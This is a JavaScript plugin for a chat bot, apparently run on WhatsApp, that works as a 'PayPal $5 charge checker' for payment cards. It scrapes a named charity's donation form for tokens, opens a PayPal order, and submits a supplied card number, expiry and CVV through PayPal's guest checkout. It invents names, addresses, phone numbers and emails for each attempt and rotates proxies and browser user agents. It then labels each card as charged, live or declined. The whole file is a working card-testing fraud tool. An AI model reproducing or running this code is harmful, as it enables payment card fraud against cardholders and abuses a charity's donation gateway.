// plugins/checker/ppcharge.js
// PayPal $5 charge checker
// Usage: .ppcharge NUMBER|MM|YY|CVV

const fs = require('fs');
const path = require('path');

// Optional proxy support — install if needed:
// npm install https-proxy-agent socks-proxy-agent
let HttpsProxyAgent = null, SocksProxyAgent = null;
try { ({ HttpsProxyAgent } = require('https-proxy-agent')); } catch (e) {}
try { ({ SocksProxyAgent } = require('socks-proxy-agent')); } catch (e) {}

module.exports = {
    name: 'pp',
    category: 'checker',
    ownerOnly: false,
    description: 'Check card with PayPal $5 charge',

    async func(m, sock, args) {
        const prefix = global.prefixDB.get(m.key.remoteJid, global.DEFAULT_PREFIX);

        if (args.length === 0) {
            return sock.sendMessage(m.key.remoteJid, {
                text: `❌ *Usage:* ${prefix}pp NUMBER|MM|YY|CVV\n` +
                      `*Example:* ${prefix}pp 4111111111111111|12|25|123`
            }, { quoted: m });
        }

        const card = args[0];
        const ccParts = card.split('|');

        if (ccParts.length !== 4) {
            return sock.sendMessage(m.key.remoteJid, {
                text: `❌ Invalid format. Use: NUMBER|MM|YY|CVV\nExample: 4111111111111111|12|25|123`
            }, { quoted: m });
        }

        // Send processing message
        let processingKey = null;
        try {
            const processingMsg = await sock.sendMessage(m.key.remoteJid, {
                text: `🔄 *Processing...*\n💳 ${card}\n🌐 PayPal $5 Charge`
            }, { quoted: m });
            processingKey = processingMsg?.key || null;
        } catch (e) {}

        const startTime = Date.now();

        try {
            const cardData = {
                num: ccParts[0].replace(/\s/g, ''),
                mon: ccParts[1].padStart(2, '0'),
                yer: ccParts[2].length > 2 ? ccParts[2].slice(-2) : ccParts[2],
                cvc: ccParts[3]
            };

            const userAgents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            ];
            const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

            // Proxy setup
            let proxyUsed = false;
            let proxyStatus = 'Direct 🌐';
            let proxyAgent = null;

            const proxyFile = path.join(__dirname, '../proxies.txt');
            let proxies = [];
            if (fs.existsSync(proxyFile)) {
                proxies = fs.readFileSync(proxyFile, 'utf8')
                    .split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'));
            }

            // Step 1: Get form hash and IDs
            let html = '';
            if (proxies.length > 0) {
                const randomProxy = proxies[Math.floor(Math.random() * proxies.length)];
                try {
                    proxyAgent = createProxyAgent(randomProxy);
                    proxyUsed = true;
                    proxyStatus = 'Live 🔥';
                    const r = await global.axios.get('https://www.brightercommunities.org/donate-form/', {
                        headers: { 'User-Agent': userAgent },
                        httpsAgent: proxyAgent,
                        timeout: 30000
                    });
                    html = r.data;
                } catch (e) {
                    proxyStatus = 'Dead ❌';
                    const r = await global.axios.get('https://www.brightercommunities.org/donate-form/', {
                        headers: { 'User-Agent': userAgent }, timeout: 30000
                    });
                    html = r.data;
                }
            } else {
                const r = await global.axios.get('https://www.brightercommunities.org/donate-form/', {
                    headers: { 'User-Agent': userAgent }, timeout: 30000
                });
                html = r.data;
            }

            const hashMatch  = html.match(/name="give-form-hash" value="([^"]+)"/);
            const formIdMatch = html.match(/name="give-form-id" value="([^"]+)"/);
            const prefixMatch = html.match(/name="give-form-id-prefix" value="([^"]+)"/);

            if (!hashMatch || !formIdMatch || !prefixMatch) throw new Error('Failed to extract form data');

            const hashVal  = hashMatch[1];
            const formId   = formIdMatch[1];
            const formPfx  = prefixMatch[1];

            const firstName = generateRandomName();
            const lastName  = generateRandomName();
            const email     = `${firstName.toLowerCase()}.${lastName.toLowerCase()}${Math.floor(Math.random() * 100)}@gmail.com`;
            const phone     = generateRandomPhone();
            const street    = generateRandomStreet();
            const city      = generateRandomCity();
            const state     = generateRandomState();
            const zipcode   = generateRandomZip();

            // Step 2: Create order
            const orderPayload = new URLSearchParams();
            orderPayload.append('give-form-id-prefix', formPfx);
            orderPayload.append('give-form-id', formId);
            orderPayload.append('give-form-minimum', '5.00');
            orderPayload.append('give-form-hash', hashVal);
            orderPayload.append('give-amount', '5.00');
            orderPayload.append('give_first', firstName);
            orderPayload.append('give_last', lastName);
            orderPayload.append('give_email', email);

            const axiosOpts = (extra = {}) => ({
                headers: { 'User-Agent': userAgent, 'Content-Type': 'application/x-www-form-urlencoded', ...extra },
                ...(proxyUsed && proxyStatus === 'Live 🔥' ? { httpsAgent: proxyAgent } : {}),
                timeout: 30000
            });

            const orderResponse = await global.axios.post(
                'https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order',
                orderPayload.toString(), axiosOpts()
            );

            if (!orderResponse.data?.data?.id) throw new Error('Order creation failed');
            const orderId = orderResponse.data.data.id;

            const cardType = getCardType(cardData.num[0]);

            // Step 3: PayPal GraphQL
            const graphqlPayload = {
                query: `mutation payWithCard($token:String!$card:CardInput$paymentToken:String$phoneNumber:String$firstName:String$lastName:String$shippingAddress:AddressInput$billingAddress:AddressInput$email:String$currencyConversionType:CheckoutCurrencyConversionType$installmentTerm:Int$identityDocument:IdentityDocumentInput$feeReferenceId:String){approveGuestPaymentWithCreditCard(token:$token card:$card paymentToken:$paymentToken phoneNumber:$phoneNumber firstName:$firstName lastName:$lastName email:$email shippingAddress:$shippingAddress billingAddress:$billingAddress currencyConversionType:$currencyConversionType installmentTerm:$installmentTerm identityDocument:$identityDocument feeReferenceId:$feeReferenceId){flags{is3DSecureRequired}cart{intent cartId buyer{userId auth{accessToken}}returnUrl{href}}paymentContingencies{threeDomainSecure{status method redirectUrl{href}parameter}}}}`,
                variables: {
                    token: orderId,
                    card: { cardNumber: cardData.num, type: cardType, expirationDate: `${cardData.mon}/20${cardData.yer}`, postalCode: zipcode, securityCode: cardData.cvc },
                    phoneNumber: phone, firstName, lastName, email,
                    billingAddress:  { givenName: firstName, familyName: lastName, country: 'US', line1: street, line2: '', city, state, postalCode: zipcode },
                    shippingAddress: { givenName: firstName, familyName: lastName, country: 'US', line1: street, line2: '', city, state, postalCode: zipcode },
                    currencyConversionType: 'PAYPAL'
                },
                operationName: null
            };

            const paypalResponse = await global.axios.post(
                'https://www.paypal.com/graphql?fetch_credit_form_submit=',
                graphqlPayload,
                { headers: { 'User-Agent': userAgent, 'Content-Type': 'application/json' }, ...(proxyUsed && proxyStatus === 'Live 🔥' ? { httpsAgent: proxyAgent } : {}), timeout: 30000 }
            );

            const processingTime = ((Date.now() - startTime) / 1000).toFixed(2);
            const result = parsePayPalResponse(paypalResponse.data, card, processingTime, firstName, lastName, street, city, state, zipcode, phone, email);
            result.proxy_status = proxyStatus;

            // BIN lookup
            const bin = cardData.num.slice(0, 6);
            let brand = getCardType(cardData.num[0]), binCountry = '', binBank = '';
            try {
                const binRes = await global.axios.get(`https://lookup.binlist.net/${bin}`, { timeout: 5000, headers: { 'Accept-Version': '3' } });
                brand      = binRes.data?.scheme?.toUpperCase() || brand;
                binCountry = binRes.data?.country?.name || '';
                binBank    = binRes.data?.bank?.name || '';
            } catch (e) {}

            const resultText =
                `${result.card_status}\n` +
                `━━━━━━━━━━━━━━━\n` +
                `「💳」 𝗖𝗖 - ${card}\n` +
                `「⟐」 𝗦𝘁𝗮𝘁𝘂𝘀 : ${result.message}\n` +
                `「🔥」 𝗚𝗮𝘁𝗲 : PayPal Charge $5\n` +
                `━━━━━━━━━━━━━━━\n` +
                `「ϟ」 𝗕𝗶𝗻 : ${bin}${binBank ? ` - ${binBank}` : ''}\n` +
                `「⟐」 𝗕𝗿𝗮𝗻𝗱 : ${brand}${binCountry ? ` - ${binCountry}` : ''}\n` +
                `━━━━━━━━━━━━━━━\n` +
                `「⌚」 𝗧𝗶𝗺𝗲 : ${processingTime}s\n` +
                ` ╚━━━━━━「🅰️n0nOtF  𝐂𝐇𝐄𝐂𝐊𝐄𝗥」━━━━━━╝`;

            if (processingKey) {
                try { await sock.sendMessage(m.key.remoteJid, { text: resultText, edit: processingKey }); }
                catch (e) { await sock.sendMessage(m.key.remoteJid, { text: resultText }, { quoted: m }); }
            } else {
                await sock.sendMessage(m.key.remoteJid, { text: resultText }, { quoted: m });
            }

        } catch (error) {
            const processingTime = ((Date.now() - startTime) / 1000).toFixed(2);
            let errDetail = error.message;
            if (error.code === 'ECONNABORTED') errDetail = 'Connection timeout';
            else if (error.response) errDetail = `API Error ${error.response.status}`;
            else if (error.request) errDetail = 'No response from server';

            const errText =
                `ERROR  ❌\n` +
                `━━━━━━━━━━━━━━━\n` +
                `「💳」 𝗖𝗖 - ${card}\n` +
                `「⟐」 𝗦𝘁𝗮𝘁𝘂𝘀 : ${errDetail}\n` +
                `「🔥」 𝗚𝗮𝘁𝗲 : PayPal Charge $5\n` +
                `━━━━━━━━━━━━━━━\n` +
                `「⌚」 𝗧𝗶𝗺𝗲 : ${processingTime}s\n` +
                ` ╚━━━━━━「🅰️n0nOtF  𝐂𝐇𝐄𝐂𝐊𝐄𝗥」━━━━━━╝`;

            if (processingKey) {
                try { await sock.sendMessage(m.key.remoteJid, { text: errText, edit: processingKey }); }
                catch (e) { await sock.sendMessage(m.key.remoteJid, { text: errText }, { quoted: m }); }
            } else {
                await sock.sendMessage(m.key.remoteJid, { text: errText }, { quoted: m });
            }
        }
    }
};

// ==================== HELPERS ====================

function createProxyAgent(proxyString) {
    if (!HttpsProxyAgent && !SocksProxyAgent) return null; // packages not installed
    if ((proxyString.startsWith('socks4://') || proxyString.startsWith('socks5://')) && SocksProxyAgent)
        return new SocksProxyAgent(proxyString);
    if (!HttpsProxyAgent) return null;
    if (proxyString.includes('@'))
        return new HttpsProxyAgent(`http://${proxyString}`);
    if (proxyString.split(':').length === 4) {
        const [host, port, user, pass] = proxyString.split(':');
        return new HttpsProxyAgent(`http://${user}:${pass}@${host}:${port}`);
    }
    return new HttpsProxyAgent(`http://${proxyString}`);
}

function getCardType(firstDigit) {
    return { '3': 'JCB', '4': 'VISA', '5': 'MASTER_CARD', '6': 'DISCOVER' }[firstDigit] || 'Unknown';
}

function parsePayPalResponse(responseData, card, processingTime, firstName, lastName, street, city, state, zipcode, phone, email) {
    const s = JSON.stringify(responseData);

    if (s.includes('accessToken') || s.includes('cartId'))
        return { card_status: 'CHARGED 🔥', message: '$5 Charged Successfully', processing_time: processingTime, card, gateway: 'PayPal Charge $5' };
    if (s.includes('INVALID_SECURITY_CODE'))
        return { card_status: 'CCN 🟢', message: 'Invalid security code (CVV2 Failure)', processing_time: processingTime, card, gateway: 'PayPal Charge $5' };
    if (s.includes('INVALID_BILLING_ADDRESS'))
        return { card_status: 'LIVE 🟢', message: 'Insufficient funds - Card Live', processing_time: processingTime, card, gateway: 'PayPal Charge $5' };
    if (s.includes('EXISTING_ACCOUNT_RESTRICTED'))
        return { card_status: 'DECLINED ❌', message: 'Existing account restricted', processing_time: processingTime, card, gateway: 'PayPal Charge $5' };
    if (s.includes('RISK_DISALLOWED'))
        return { card_status: 'DECLINED ❌', message: 'Risk disallowed', processing_time: processingTime, card, gateway: 'PayPal Charge $5' };
    if (s.includes('ISSUER_DATA_NOT_FOUND'))
        return { card_status: 'DECLINED ❌', message: 'Issuer data not found', processing_time: processingTime, card, gateway: 'PayPal Charge $5' };
    if (s.includes('ISSUER_DECLINE'))
        return { card_status: 'DECLINED ❌', message: 'Issuer decline', processing_time: processingTime, card, gateway: 'PayPal Charge $5' };
    if (s.includes('EXPIRED_CARD'))
        return { card_status: 'DECLINED ❌', message: 'Card expired', processing_time: processingTime, card, gateway: 'PayPal Charge $5' };

    try {
        if (responseData.errors?.length > 0) {
            const err = responseData.errors[0];
            const code = err.data?.[0]?.code || '';
            const msg  = err.message || '';
            if (msg) return { card_status: 'DECLINED ❌', message: code ? `${msg} (${code})` : msg, processing_time: processingTime, card, gateway: 'PayPal Charge $5' };
        }
    } catch (e) {}

    return { card_status: 'DECLINED ❌', message: 'Generic decline', processing_time: processingTime, card, gateway: 'PayPal Charge $5' };
}

function generateRandomName()   { return ['James','John','Robert','Michael','William','David','Mary','Patricia','Jennifer','Linda'][Math.floor(Math.random()*10)]; }
function generateRandomPhone()  { return `+1${Math.floor(Math.random()*900+100)}${Math.floor(Math.random()*900+100)}${Math.floor(Math.random()*9000+1000)}`; }
function generateRandomStreet() { return `${Math.floor(Math.random()*9000+100)} ${['Main St','Broadway','Park Ave','Washington St','Maple Ave','Oak St'][Math.floor(Math.random()*6)]}`; }
function generateRandomCity()   { return ['New York','Los Angeles','Chicago','Houston','Phoenix','Philadelphia','San Antonio','San Diego'][Math.floor(Math.random()*8)]; }
function generateRandomState()  { return ['NY','CA','IL','TX','AZ','PA','FL','OH'][Math.floor(Math.random()*8)]; }
function generateRandomZip()    { return String(Math.floor(Math.random()*90000+10000)); }

